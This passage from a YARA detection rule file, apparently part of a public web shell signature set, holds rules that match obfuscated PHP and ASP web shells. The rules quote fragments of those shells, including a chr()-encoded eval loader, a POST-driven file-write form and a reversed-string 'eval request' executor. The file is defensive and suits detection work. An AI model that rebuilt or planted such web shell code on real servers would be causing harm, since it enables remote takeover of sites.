		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "cf2ab009cbd2576a806bfefb74906fdf"
	strings:
		$s0 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u"
	condition:
		all of them
}
rule webshell_webshells_new_PHP {
	meta:
		description = "Web shells - generated from file PHP.php"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "a524e7ae8d71e37d2fd3e5fbdab405ea"
	strings:
		$s1 = "echo \"<font color=blue>Error!</font>\";" fullword
		$s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILE"
		$s5 = " - ExpDoor.com</title>" fullword
		$s10 = "$f=fopen($_POST[\"f\"],\"w\");" fullword
		$s12 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword
	condition:
		1 of them
}
rule webshell_webshells_new_Asp {
	meta:
		description = "Web shells - generated from file Asp.asp"
		author = "Florian Roth"
		date = "2014/03/28"
		score = 70
		hash = "32c87744ea404d0ea0debd55915010b7"
	strings:
		$s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")" fullword
		$s2 = "Function MorfiCoder(Code)" fullword
		$s3 = "MorfiCoder=Replace(Replace(StrReverse(Code),\"/*/\",\"\"\"\"),\"\\*\\\",vbCrlf)" fullword
	condition:
		1 of them
}